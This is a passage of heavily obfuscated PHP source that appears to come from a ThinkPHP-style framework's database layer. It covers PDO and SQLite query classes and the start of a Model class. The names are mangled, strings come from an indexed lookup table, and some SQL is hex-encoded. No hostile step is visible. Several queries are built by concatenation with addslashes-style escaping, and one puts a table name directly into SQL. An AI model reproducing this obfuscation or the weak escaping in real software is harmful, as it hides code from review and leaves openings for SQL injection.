$ì¼ÕÑŒ[] = $this->parseKey($¢–™Ô·); } } $ˆ¹÷†íÚ = $ÃÙñÈó×[912] . $this->parseTable($„îÑ‡Ü[$ÃÙñÈó×[279]]) . $ÃÙñÈó×[913] . implode($ÃÙñÈó×[50], $ì¼ÕÑŒ) . $ÃÙñÈó×[914] . implode($ÃÙñÈó×[50], $»¶ó·±È) . $ÃÙñÈó×[915]; return $this->execute($ˆ¹÷†íÚ); } public function insertAll($Èü¥âÑï, $¾‡Öäú = array(), $Öè‰“ô³ = false) { $ßƒ˜Ğ =& $_SERVER[ï»»·÷á]; if (!is_array($Èü¥âÑï[0])) { return !1; } $‹´÷±¤¹ = array_keys($Èü¥âÑï[0]); $ì´ÏüÓ” = array(); foreach ($Èü¥âÑï as $’ø•Î®¸) { $Ô ø‰¾ = array(); foreach ($’ø•Î®¸ as $¨ŒÌî• => $¼„’¥ô) { $¼„’¥ô = $this->parseValue($¼„’¥ô); if (is_scalar($¼„’¥ô)) { $Ô ø‰¾[] = $¼„’¥ô; } } $ì´ÏüÓ”[] = $ßƒ˜Ğ[260] . implode($ßƒ˜Ğ[50], $Ô ø‰¾) . $ßƒ˜Ğ[915]; } array_walk($‹´÷±¤¹, array($this, $ßƒ˜Ğ[916])); $ÂìŞ•Èş = $Öè‰“ô³ ? $ßƒ˜Ğ[917] : $ßƒ˜Ğ[918]; $ã®ëÛÄú = $ÂìŞ•Èş . $ßƒ˜Ğ[919] . $this->parseTable($¾‡Öäú[$ßƒ˜Ğ[279]]) . $ßƒ˜Ğ[913] . implode($ßƒ˜Ğ[50], $‹´÷±¤¹) . $ßƒ˜Ğ[920] . implode($ßƒ˜Ğ[50], $ì´ÏüÓ”); return $this->execute($ã®ëÛÄú); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $­·ÎœÌƒ =& $_SERVER[ï»»·÷á]; $this->error = $this->_linkID->errno . $­·ÎœÌƒ[4] . $this->_linkID->error; if ($­·ÎœÌƒ[12] != $this->queryStr) { $this->error .= LNG($­·ÎœÌƒ[48]) . $this->queryStr; } think_trace($this->error, $­·ÎœÌƒ[12], $­·ÎœÌƒ[49]); return $this->error; } public function escapeString($ÁæÊÎ¾’) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÁæÊÎ¾’); } else { return addslashes($ÁæÊÎ¾’); } } public function parseKey(&$ğôø’ÚŒ, $†”ğâˆû = true) { $à†ŸŸ¶õ =& $_SERVER[ï»»·÷á]; if ($†”ğâˆû) { $ğôø’ÚŒ = $this->parseKeyCheck($ğôø’ÚŒ); } if ($ğôø’ÚŒ != $à†ŸŸ¶õ[189] && !preg_match($à†ŸŸ¶õ[921], $ğôø’ÚŒ)) { $ğôø’ÚŒ = $à†ŸŸ¶õ[385] . trim($ğôø’ÚŒ, $à†ŸŸ¶õ[385]) . $à†ŸŸ¶õ[385]; } return $ğôø’ÚŒ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÜÄë¯´ = '') { $êŸÆç =& $_SERVER[ï»»·÷á]; if (!class_exists($êŸÆç[924])) { think_exception(think_lang($êŸÆç[14]) . $êŸÆç[925]); } if (!empty($ÜÄë¯´)) { $this->config = $ÜÄë¯´; if (empty($this->config[$êŸÆç[17]])) { $this->config[$êŸÆç[17]] = array(); } } } public function connect($âè«¿¯§ = '', $¾®ôú = 0) { $’çäùê =& $_SERVER[ï»»·÷á]; if (!isset($this->linkID[$¾®ôú])) { if (empty($âè«¿¯§)) { $âè«¿¯§ = $this->config; } $åÒËõÚŠ = !empty($âè«¿¯§[$’çäùê[17]][$’çäùê[18]]) ? $âè«¿¯§[$’çäùê[17]][$’çäùê[18]] : $this->pconnect; if ($åÒËõÚŠ) { $âè«¿¯§[$’çäùê[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¾®ôú] = new PDO($âè«¿¯§[$’çäùê[926]], $âè«¿¯§[$’çäùê[898]], $âè«¿¯§[$’çäùê[899]], $âè«¿¯§[$’çäùê[17]]); } catch (PDOException $ÇÂà¢åú) { think_exception($ÇÂà¢åú->getMessage()); } $this->dbType = $this->_getDsnType($âè«¿¯§[$’çäùê[926]]); if (in_array($this->dbType, array($’çäùê[927], $’çäùê[928], $’çäùê[929], $’çäùê[930]))) { think_exception($’çäùê[931] . $this->dbType . $’çäùê[932] . $this->dbType . $’çäùê[933]); } if (!$this->linkID[$¾®ôú]) { think_exception($’çäùê[934]); } try { $this->linkID[$¾®ôú]->exec($’çäùê[935] . think_config($’çäùê[901])); } catch (Exception $ÇÂà¢åú) { } $this->connected = !0; if (1 != think_config($’çäùê[22])) { unset($this->config); } } return $this->linkID[$¾®ôú]; } public function free() { $this->PDOStatement = null; } public function query($ö¼§ÜÇñ, $™í“£Ş = array()) { $ÈúÙ‘ßœ =& $_SERVER[ï»»·÷á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ö¼§ÜÇñ; if (!empty($™í“£Ş)) { $this->queryStr .= $ÈúÙ‘ßœ[936] . print_r($™í“£Ş, !0) . $ÈúÙ‘ßœ[937]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÈúÙ‘ßœ[23], 1); think_status($ÈúÙ‘ßœ[24]); $this->PDOStatement = $this->_linkID->prepare($ö¼§ÜÇñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‘ìØ‹Ş = $this->PDOStatement->execute($™í“£Ş); $this->debug(); if (!1 === $‘ìØ‹Ş) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÃŞ´ª¡–, $ıøı³Û = array()) { $©Üù£Îú =& $_SERVER[ï»»·÷á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÃŞ´ª¡–; if (!empty($ıøı³Û)) { $this->queryStr .= $©Üù£Îú[936] . print_r($ıøı³Û, !0) . $©Üù£Îú[937]; } $º»™Öê› = !1; if ($this->dbType == $©Üù£Îú[930]) { if (preg_match($©Üù£Îú[938], $this->queryStr, $Ï¸ïÍ‘¥)) { $this->table = think_config($©Üù£Îú[939]) . str_ireplace(think_config($©Üù£Îú[940]), $©Üù£Îú[378], $Ï¸ïÍ‘¥[2]); $º»™Öê› = (bool) $this->query($©Üù£Îú[941] . strtoupper($this->table) . $©Üù£Îú[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($©Üù£Îú[25], 1); think_status($©Üù£Îú[24]); $this->PDOStatement = $this->_linkID->prepare($ÃŞ´ª¡–); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $áé—ÔòÆ = $this->PDOStatement->execute($ıøı³Û); $this->debug(); if (!1 === $áé—ÔòÆ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($º»™Öê› || preg_match($©Üù£Îú[942], $ÃŞ´ª¡–)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ú¦û†Ç£ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ú¦û†Ç£) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ğÏ»“Ÿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ğÏ»“Ÿ) { $this->error(); return !1; } } return !0; } private function getAll() { $¬×šŸ©­ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¬×šŸ©­); return $¬×šŸ©­; } public function getFields($©ºÄ ê¢) { $µ‹š‹‡Í =& $_SERVER[ï»»·÷á]; $this->initConnect(!0); if (think_config($µ‹š‹‡Í[943])) { $¬¨ğ–ë¸ = str_replace($µ‹š‹‡Í[944], $©ºÄ ê¢, think_config($µ‹š‹‡Í[943])); } else { switch ($this->dbType) { case $µ‹š‹‡Í[927]: case $µ‹š‹‡Í[945]: $¬¨ğ–ë¸ = "\x53\105\x4c\x45\103\124\x20\x20\40\x63\x6f\154\x75\x6d\156\137\x6e\x61\x6d\145\40\141\x73\x20\47\116\x61\155\145\x27\x2c\x20\x20\x20\x64\141\164\x61\137\164\171\160\x65\x20\x61\163\40\47\x54\x79\160\145\x27\x2c\40\40\x20\143\157\x6c\165\155\156\x5f\x64\x65\146\141\165\x6c\164\x20\x61\x73\x20\x27\x44\145\146\141\165\154\x74\47\x2c\40\40\x20\151\163\x5f\156\x75\x6c\154\141\142\154\145\x20\141\x73\x20\47\116\165\x6c\154\x27\12\11\x9\x46\122\117\x4d\x9\151\x6e\x66\x6f\x72\155\141\x74\x69\157\x6e\x5f\163\x63\x68\x65\x6d\141\56\164\141\x62\154\145\163\40\101\x53\x20\x74\xa\11\11\112\x4f\x49\116\11\151\156\146\157\162\155\x61\x74\151\157\156\137\x73\143\150\x65\x6d\x61\x2e\143\157\x6c\165\155\x6e\x73\x20\101\x53\40\x63\xa\x9\11\117\x4e\40\40\164\56\164\141\142\154\145\137\x63\141\x74\141\x6c\157\147\x20\x3d\40\143\x2e\x74\x61\142\x6c\145\x5f\143\x61\164\141\154\x6f\x67\12\x9\x9\101\116\104\x20\164\x2e\x74\141\x62\x6c\x65\137\163\143\150\x65\155\141\40\x3d\40\x63\x2e\164\141\142\154\x65\x5f\x73\143\150\x65\x6d\x61\xa\x9\11\101\116\104\x20\x74\x2e\164\141\x62\154\x65\137\x6e\x61\x6d\145\x20\75\x20\143\56\164\x61\x62\154\x65\x5f\156\141\x6d\145\12\x9\x9\x57\x48\105\x52\105\x20\40\x20\164\56\164\141\142\x6c\x65\x5f\x6e\x61\x6d\x65\40\x3d\x20\47{$©ºÄ ê¢}\x27"; break; case $µ‹š‹‡Í[946]: $¬¨ğ–ë¸ = $µ‹š‹‡Í[947] . $©ºÄ ê¢ . $µ‹š‹‡Í[948]; break; case $µ‹š‹‡Í[928]: case $µ‹š‹‡Í[930]: $¬¨ğ–ë¸ = $µ‹š‹‡Í[949] . $µ‹š‹‡Í[950] . $µ‹š‹‡Í[951] . strtoupper($©ºÄ ê¢) . $µ‹š‹‡Í[952] . strtoupper($©ºÄ ê¢) . $µ‹š‹‡Í[953]; break; case $µ‹š‹‡Í[954]: $¬¨ğ–ë¸ = $µ‹š‹‡Í[955] . $©ºÄ ê¢ . $µ‹š‹‡Í[956]; break; case $µ‹š‹‡Í[929]: break; case $µ‹š‹‡Í[957]: default: $¬¨ğ–ë¸ = $µ‹š‹‡Í[958] . ($this->dbType == $µ‹š‹‡Í[957] ? "\x60{$©ºÄ ê¢}\140" : $©ºÄ ê¢); } } $‚ûİˆ¼Î = $this->query($¬¨ğ–ë¸); $ ŠĞ¿äŞ = array(); if ($‚ûİˆ¼Î) { foreach ($‚ûİˆ¼Î as $Şú„§º => $ùÓ½Åœ) { $ùÓ½Åœ = array_change_key_case($ùÓ½Åœ); $ùÓ½Åœ[$µ‹š‹‡Í[32]] = isset($ùÓ½Åœ[$µ‹š‹‡Í[32]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[32]] : $µ‹š‹‡Í[378]; $ùÓ½Åœ[$µ‹š‹‡Í[33]] = isset($ùÓ½Åœ[$µ‹š‹‡Í[33]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[33]] : $µ‹š‹‡Í[378]; $ÕØĞ£Ç· = isset($ùÓ½Åœ[$µ‹š‹‡Í[273]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[273]] : $ùÓ½Åœ[$µ‹š‹‡Í[32]]; $ ŠĞ¿äŞ[$ÕØĞ£Ç·] = array($µ‹š‹‡Í[32] => $ÕØĞ£Ç·, $µ‹š‹‡Í[33] => $ùÓ½Åœ[$µ‹š‹‡Í[33]], $µ‹š‹‡Í[35] => (bool) (isset($ùÓ½Åœ[$µ‹š‹‡Í[103]]) && $ùÓ½Åœ[$µ‹š‹‡Í[103]] === $µ‹š‹‡Í[12] || isset($ùÓ½Åœ[$µ‹š‹‡Í[35]]) && $ùÓ½Åœ[$µ‹š‹‡Í[35]] === $µ‹š‹‡Í[12]), $µ‹š‹‡Í[37] => isset($ùÓ½Åœ[$µ‹š‹‡Í[37]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[37]] : (isset($ùÓ½Åœ[$µ‹š‹‡Í[56]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[56]] : $µ‹š‹‡Í[378]), $µ‹š‹‡Í[39] => isset($ùÓ½Åœ[$µ‹š‹‡Í[94]]) ? strtolower($ùÓ½Åœ[$µ‹š‹‡Í[94]]) == $µ‹š‹‡Í[41] : (isset($ùÓ½Åœ[$µ‹š‹‡Í[57]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[57]] : !1), $µ‹š‹‡Í[42] => isset($ùÓ½Åœ[$µ‹š‹‡Í[959]]) ? strtolower($ùÓ½Åœ[$µ‹š‹‡Í[959]]) == $µ‹š‹‡Í[44] : (isset($ùÓ½Åœ[$µ‹š‹‡Í[94]]) ? $ùÓ½Åœ[$µ‹š‹‡Í[94]] : !1)); } } return $ ŠĞ¿äŞ; } public function getTables($ùú¼³ÍÚ = '') { $†Å•ºâ¸ =& $_SERVER[ï»»·÷á]; if (think_config($†Å•ºâ¸[960])) { $ì¤Ë®»˜ = str_replace($†Å•ºâ¸[961], $ùú¼³ÍÚ, think_config($†Å•ºâ¸[960])); } else { switch ($this->dbType) { case $†Å•ºâ¸[928]: case $†Å•ºâ¸[930]: $ì¤Ë®»˜ = $†Å•ºâ¸[962]; break; case $†Å•ºâ¸[927]: case $†Å•ºâ¸[945]: $ì¤Ë®»˜ = $†Å•ºâ¸[963]; break; case $†Å•ºâ¸[954]: $ì¤Ë®»˜ = $†Å•ºâ¸[964]; break; case $†Å•ºâ¸[929]: think_exception(think_lang($†Å•ºâ¸[965]) . $†Å•ºâ¸[966]); break; case $†Å•ºâ¸[946]: $ì¤Ë®»˜ = $†Å•ºâ¸[45] . $†Å•ºâ¸[46] . $†Å•ºâ¸[47]; break; case $†Å•ºâ¸[957]: default: if (!empty($ùú¼³ÍÚ)) { $ì¤Ë®»˜ = $†Å•ºâ¸[909] . $ùú¼³ÍÚ . $†Å•ºâ¸[910]; } else { $ì¤Ë®»˜ = $†Å•ºâ¸[911]; } } } $µë©ğÅ = $this->query($ì¤Ë®»˜); $ø˜ŠÓƒ” = array(); foreach ($µë©ğÅ as $¬š¿œİ¸ => $ÒºÚöäØ) { $ø˜ŠÓƒ”[$¬š¿œİ¸] = current($ÒºÚöäØ); } return $ø˜ŠÓƒ”; } protected function parseLimit($äµãòµ¯) { $‚³Û©¹‹ =& $_SERVER[ï»»·÷á]; $Ä¸ßô§ï = $‚³Û©¹‹[12]; if (!empty($äµãòµ¯)) { switch ($this->dbType) { case $‚³Û©¹‹[954]: case $‚³Û©¹‹[946]: $äµãòµ¯ = explode($‚³Û©¹‹[50], $äµãòµ¯); if (count($äµãòµ¯) > 1) { $Ä¸ßô§ï .= $‚³Û©¹‹[51] . $äµãòµ¯[1] . $‚³Û©¹‹[52] . $äµãòµ¯[0] . $‚³Û©¹‹[53]; } else { $Ä¸ßô§ï .= $‚³Û©¹‹[51] . $äµãòµ¯[0] . $‚³Û©¹‹[53]; } break; case $‚³Û©¹‹[927]: case $‚³Û©¹‹[945]: break; case $‚³Û©¹‹[929]: break; case $‚³Û©¹‹[928]: case $‚³Û©¹‹[930]: break; case $‚³Û©¹‹[957]: default: $Ä¸ßô§ï .= $‚³Û©¹‹[51] . $äµãòµ¯ . $‚³Û©¹‹[53]; } } return $Ä¸ßô§ï; } public function parseKey(&$æµ¿å’Í, $Ã˜Åšú = true) { $Çúú­‡ =& $_SERVER[ï»»·÷á]; if ($Ã˜Åšú) { $æµ¿å’Í = $this->parseKeyCheck($æµ¿å’Í); } if ($this->dbType == $Çúú­‡[957]) { if ($æµ¿å’Í != $Çúú­‡[189] && !preg_match($Çúú­‡[921], $æµ¿å’Í)) { $æµ¿å’Í = $Çúú­‡[385] . trim($æµ¿å’Í, $Çúú­‡[385]) . $Çúú­‡[385]; } return $æµ¿å’Í; } else { return parent::parseKey($æµ¿å’Í, $Ã˜Åšú); } } public function close() { $this->_linkID = null; } public function error() { $Ã°µÕÔÍ =& $_SERVER[ï»»·÷á]; if ($this->PDOStatement) { $ÃÒ¬ÕÂã = $this->PDOStatement->errorInfo(); $this->error = $ÃÒ¬ÕÂã[1] . $Ã°µÕÔÍ[4] . $ÃÒ¬ÕÂã[2]; } else { $this->error = $Ã°µÕÔÍ[12]; } if ($Ã°µÕÔÍ[12] != $this->queryStr) { $this->error .= LNG($Ã°µÕÔÍ[48]) . $this->queryStr; } think_trace($this->error, $Ã°µÕÔÍ[12], $Ã°µÕÔÍ[49]); return $this->error; } public function escapeString($Å¤ïæÂ¬) { $Ï•‚¢áï =& $_SERVER[ï»»·÷á]; switch ($this->dbType) { case $Ï•‚¢áï[954]: case $Ï•‚¢áï[927]: case $Ï•‚¢áï[945]: case $Ï•‚¢áï[957]: return addslashes($Å¤ïæÂ¬); case $Ï•‚¢áï[929]: case $Ï•‚¢áï[946]: case $Ï•‚¢áï[928]: case $Ï•‚¢áï[930]: return str_ireplace($Ï•‚¢áï[58], $Ï•‚¢áï[59], $Å¤ïæÂ¬); } } protected function parseValue($ï’¾ŞÌ×) { $‰Á·í =& $_SERVER[ï»»·÷á]; if (is_string($ï’¾ŞÌ×)) { $í§…ÀšÌ = strpos($ï’¾ŞÌ×, $‰Á·í[4]) === 0 && in_array($ï’¾ŞÌ×, array_keys($this->bind)); $ï’¾ŞÌ× = $í§…ÀšÌ ? $this->escapeString($ï’¾ŞÌ×) : $‰Á·í[967] . $this->escapeString($ï’¾ŞÌ×) . $‰Á·í[967]; } elseif (isset($ï’¾ŞÌ×[0]) && is_string($ï’¾ŞÌ×[0]) && strtolower($ï’¾ŞÌ×[0]) == $‰Á·í[297]) { $ï’¾ŞÌ× = $this->escapeString($ï’¾ŞÌ×[1]); } elseif (is_array($ï’¾ŞÌ×)) { $ï’¾ŞÌ× = array_map(array($this, $‰Á·í[968]), $ï’¾ŞÌ×); } elseif (is_bool($ï’¾ŞÌ×)) { $ï’¾ŞÌ× = $ï’¾ŞÌ× ? $‰Á·í[88] : $‰Á·í[198]; } elseif (is_null($ï’¾ŞÌ×)) { $ï’¾ŞÌ× = $‰Á·í[103]; } return $ï’¾ŞÌ×; } public function getLastInsertId() { $æ‹ÙÊ Ù =& $_SERVER[ï»»·÷á]; switch ($this->dbType) { case $æ‹ÙÊ Ù[954]: case $æ‹ÙÊ Ù[946]: case $æ‹ÙÊ Ù[927]: case $æ‹ÙÊ Ù[945]: case $æ‹ÙÊ Ù[929]: case $æ‹ÙÊ Ù[957]: return $this->_linkID->lastInsertId(); case $æ‹ÙÊ Ù[928]: case $æ‹ÙÊ Ù[930]: $Ï²¯ùÔ = $this->table; $ÈùÕ¸ = $this->query("\x53\105\x4c\105\103\x54\40{$Ï²¯ùÔ}\56\x63\x75\x72\x72\x76\x61\154\40\x63\x75\162\x72\x76\141\154\40\x46\122\117\115\x20\x64\165\141\154"); return $ÈùÕ¸ ? $ÈùÕ¸[0][$æ‹ÙÊ Ù[969]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ƒ‡ƒ½ˆÇ) { $ÚÀ¤×íï =& $_SERVER[ï»»·÷á]; if (!CacheLock::fileLock($ÚÀ¤×íï[13])) { return !1; } $‘¸‰Ò» = parent::query($ƒ‡ƒ½ˆÇ); CacheLock::fileUnLock($ÚÀ¤×íï[13]); return $‘¸‰Ò»; } public function execute($›·ùˆ÷Ç) { $õİğ¹ş =& $_SERVER[ï»»·÷á]; if (!CacheLock::fileLock($õİğ¹ş[13])) { return !1; } $şÔäÁµ™ = parent::execute($›·ùˆ÷Ç); CacheLock::fileUnLock($õİğ¹ş[13]); return $şÔäÁµ™; } } goto EÕ¿ÂŠØ¤; BŠÃì­Õåá: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\x6f\162\144\145\162", "\141\154\x69\x61\x73", "\x68\141\166\x69\156\147", "\147\162\x6f\x75\160", "\154\157\143\153", "\x64\151\163\x74\x69\x6e\x63\164", "\141\x75\x74\157", "\x66\x69\x6c\x74\x65\162", "\x76\x61\154\151\144\x61\x74\x65", "\x72\x65\x73\165\154\x74", "\x62\151\x6e\144", "\164\x6f\x6b\x65\156"); public function __construct($€­‘ü„ï = '', $åÖıÂ½¤ = '', $İŒ±½ÂÔ = '') { $àœ¼Çïô =& $_SERVER[ï»»·÷á]; $this->_initialize(); if (!empty($€­‘ü„ï)) { if (strpos($€­‘ü„ï, $àœ¼Çïô[10])) { list($this->dbName, $this->name) = explode($àœ¼Çïô[10], $€­‘ü„ï); } else { $this->name = $€­‘ü„ï; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($åÖıÂ½¤)) { $this->tablePrefix = $àœ¼Çïô[12]; } elseif ($àœ¼Çïô[12] != $åÖıÂ½¤) { $this->tablePrefix = $åÖıÂ½¤; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($àœ¼Çïô[244]); } $this->db(0, empty($this->connection) ? $İŒ±½ÂÔ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $†óèÉ³ß =& $_SERVER[ï»»·÷á]; if (empty($this->fields)) { if (think_config($†óèÉ³ß[245])) { $ÊğúœÜ³ = $this->dbName ? $this->dbName : think_config($†óèÉ³ß[246]); $²›‹ÆÕµ = think_var_cache($†óèÉ³ß[247] . strtolower(get_path_this($ÊğúœÜ³) . $†óèÉ³ß[10] . $this->name)); if ($²›‹ÆÕµ) { $ãÓİ¢ˆØ = think_config($†óèÉ³ß[248]); if (empty($ãÓİ¢ˆØ) || $²›‹ÆÕµ[$†óèÉ³ß[249]] == $ãÓİ¢ˆØ) { $this->fields = $²›‹ÆÕµ; return; } } } $this->flush(); } } public function flush() { $İ¶Äû»Ä =& $_SERVER[ï»»·÷á]; $this->db->setModel($this->name); $¤¨ˆ®÷œ = $this->db->getFields($this->getTableName()); if (!$¤¨ˆ®÷œ) { return !1; } $this->fields = array_keys($¤¨ˆ®÷œ); $this->fields[$İ¶Äû»Ä[250]] = !1; foreach ($¤¨ˆ®÷œ as $‹ˆú×ÍŒ => $ÍõŠâğ¯) { $¸‡„øä°[$‹ˆú×ÍŒ] = $ÍõŠâğ¯[$İ¶Äû»Ä[33]]; if ($ÍõŠâğ¯[$İ¶Äû»Ä[39]]) { $this->fields[$İ¶Äû»Ä[251]] = $‹ˆú×ÍŒ; if ($ÍõŠâğ¯[$İ¶Äû»Ä[42]]) { $this->fields[$İ¶Äû»Ä[250]] = !0; } } } $this->fields[$İ¶Äû»Ä[252]] = $¸‡„øä°; if (think_config($İ¶Äû»Ä[248])) { $this->fields[$İ¶Äû»Ä[249]] = think_config($İ¶Äû»Ä[248]); } if (think_config($İ¶Äû»Ä[245])) { $š¥µËõ = $this->dbName ? $this->dbName : think_config($İ¶Äû»Ä[246]); think_var_cache($İ¶Äû»Ä[247] . strtolower(get_path_this($š¥µËõ) . $İ¶Äû»Ä[10] . $this->name), $this->fields); } } public function switchModel($¬õÌÜĞ¦, $ò”¾ŸŠ× = array()) { $°ûÆ€ ± =& $_SERVER[ï»»·÷á]; $¥ŒÇ²¦Š = ucwords(strtolower($¬õÌÜĞ¦)) . $°ûÆ€ ±[253]; if (!class_exists($¥ŒÇ²¦Š)) { think_exception($¥ŒÇ²¦Š . think_lang($°ûÆ€ ±[254])); } $this->_extModel = new $¥ŒÇ²¦Š($this->name); if (!empty($ò”¾ŸŠ×)) { foreach ($ò”¾ŸŠ× as $ÆªÌƒ©ù) { $this->_extModel->setProperty($ÆªÌƒ©ù, $this->{$ÆªÌƒ©ù}); } } return $this->_extModel; } public function __set($ÍúË‘‚, $‰«îò¨Á) { $this->data[$ÍúË‘‚] = $‰«îò¨Á; } public function __get($¶æÕÅ©‡) { return isset($this->data[$¶æÕÅ©‡]) ? $this->data[$¶æÕÅ©‡] : null; } public function __isset($‡¹¶ŞÀï) { return isset($this->data[$‡¹¶ŞÀï]); } public function __unset($± Ÿş´) { unset($this->data[$± Ÿş´]); } public function __call($ õ˜«Áó, $Áè×›èŒ) { $ÚâĞû€ =& $_SERVER[ï»»·÷á]; if (in_array(strtolower($ õ˜«Áó), $this->methods, !0)) { $this->options[strtolower($ õ˜«Áó)] = $Áè×›èŒ[0]; return $this; } elseif (in_array(strtolower($ õ˜«Áó), array($ÚâĞû€[255], $ÚâĞû€[256], $ÚâĞû€[257], $ÚâĞû€[258], $ÚâĞû€[259]), !0)) { $«¡ÓÂ† = isset($Áè×›èŒ[0]) ? $Áè×›èŒ[0] : $ÚâĞû€[189]; $«¡ÓÂ† = $this->db->parseKey($«¡ÓÂ†); return $this->getField(strtoupper($ õ˜«Áó) . $ÚâĞû€[260] . $«¡ÓÂ† . $ÚâĞû€[261] . $ õ˜«Áó, $ÚâĞû€[255]); } elseif (strtolower(substr($ õ˜«Áó, 0, 5)) == $ÚâĞû€[262]) { $«¡ÓÂ† = think_parse_name(substr($ õ˜«Áó, 5)); $®È®é¥Ÿ[$«¡ÓÂ†] = $Áè×›èŒ[0]; return $this->where($®È®é¥Ÿ)->find(); } elseif (strtolower(substr($ õ˜«Áó, 0, 10)) == $ÚâĞû€[263]) { $Û®æÏ¹€ = think_parse_name(substr($ õ˜«Áó, 10)); $®È®é¥Ÿ[$Û®æÏ¹€] = $Áè×›èŒ[0]; return $this->where($®È®é¥Ÿ)->getField($Áè×›èŒ[1]); } elseif (isset($this->_scope[$ õ˜«Áó])) { return $this->scope($ õ˜«Áó, $Áè×›èŒ[0]); } elseif (method_exists($this, $ õ˜«Áó)) { array_unshift($Áè×›èŒ, $ õ˜«Áó); return call_user_func_array(array($this, $ÚâĞû€[264]), $Áè×›èŒ); } else { return call_user_func_array(array(parent, $ õ˜«Áó), $Áè×›èŒ); } } protected function call() { $–±Œ‰ÎĞ =& $_SERVER[ï»»·÷á]; $š¾¡èù² = func_get_args(); $‘šÛÜëÅ = array_shift($š¾¡èù²); $ÑĞ÷Œ¨ò = $‘šÛÜëÅ; if (is_array($‘šÛÜëÅ)) { $ÑĞ÷Œ¨ò = $‘šÛÜëÅ[1]; $‘šÛÜëÅ = $‘šÛÜëÅ[0]; } $ÆÜûëÁ¸ = count($š¾¡èù²) - 1; if (isset($š¾¡èù²[$ÆÜûëÁ¸]) && $š¾¡èù²[$ÆÜûëÁ¸] === $‘šÛÜëÅ) { think_exception(__CLASS__ . $–±Œ‰ÎĞ[4] . $‘šÛÜëÅ . think_lang($–±Œ‰ÎĞ[265])); return; } $š¾¡èù²[] = $‘šÛÜëÅ; if (method_exists($this, $–±Œ‰ÎĞ[266])) { $ÙÔ­šÙœ = call_user_func_array(array($this, $–±Œ‰ÎĞ[267]), array($ÑĞ÷Œ¨ò, $š¾¡èù²)); if (!is_null($ÙÔ­šÙœ) && $ÙÔ­šÙœ !== !1) { return $ÙÔ­šÙœ; } } $ÜÀ…öáŸ = call_user_func_array(array($this, $‘šÛÜëÅ), $š¾¡èù²); if (method_exists($this, $–±Œ‰ÎĞ[268])) { $ÙÔ­šÙœ = call_user_func_array(array($this, $–±Œ‰ÎĞ[269]), array($ÑĞ÷Œ¨ò, $š¾¡èù², $ÜÀ…öáŸ)); if ($ÙÔ­šÙœ) { return $ÙÔ­šÙœ; } } return $ÜÀ…öáŸ; } protected function _initialize() { } protected function _facade($ÅÜ¶ªèİ) { $Û¾‰æ‘¨ =& $_SERVER[ï»»·÷á]; if (!empty($this->fields)) { foreach ($ÅÜ¶ªèİ as $ó‹‡· ô => $ßî¸¡Æ½) { if (is_array($this->fields) && !in_array($ó‹‡· ô, $this->fields, !0)) { unset($ÅÜ¶ªèİ[$ó‹‡· ô]); } elseif (is_scalar($ßî¸¡Æ½)) { $this->_parseType($ÅÜ¶ªèİ, $ó‹‡· ô); } } } if (!empty($this->options[$Û¾‰æ‘¨[270]])) { $ÅÜ¶ªèİ = array_map($this->options[$Û¾‰æ‘¨[270]], $ÅÜ¶ªèİ); unset($this->options[$Û¾‰æ‘¨[270]]); } $this->_beforeWrite($ÅÜ¶ªèİ); return $ÅÜ¶ªèİ; } protected function _beforeWrite(&$·ÆÂÒÒñ) { } public function add($¥í·÷• = '', $²‘ÛÖÔà = array(), $İÇ×©‰ß = false) { if (empty($¥í·÷•)) { if (!empty($this->data)) { $¥í·÷• = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ï»»·÷á][271]); return !1; } } $²‘ÛÖÔà = $this->_parseOptions($²‘ÛÖÔà); $¥í·÷• = $this->_facade($¥í·÷•); if (!1 === $this->_beforeInsert($¥í·÷•, $²‘ÛÖÔà)) { return !1; } $ºöÅèŒø = $this->db->insert($¥í·÷•, $²‘ÛÖÔà, $İÇ×©‰ß); if (!1 !== $ºöÅèŒø) { $©˜üÇèŸ = $this->getLastInsID(); if ($©˜üÇèŸ) { $¥í·÷•[$this->getPk()] = $©˜üÇèŸ; $this->_after_insert($¥í·÷•, $²‘ÛÖÔà); return $©˜üÇèŸ; } $this->_after_insert($¥í·÷•, $²‘ÛÖÔà); } return $ºöÅèŒø; } protected function _beforeInsert(&$­ÉüñË, $Ö…€“¦») { } protected function _after_insert($í Ôâ‚», $æÈ©àûŸ) 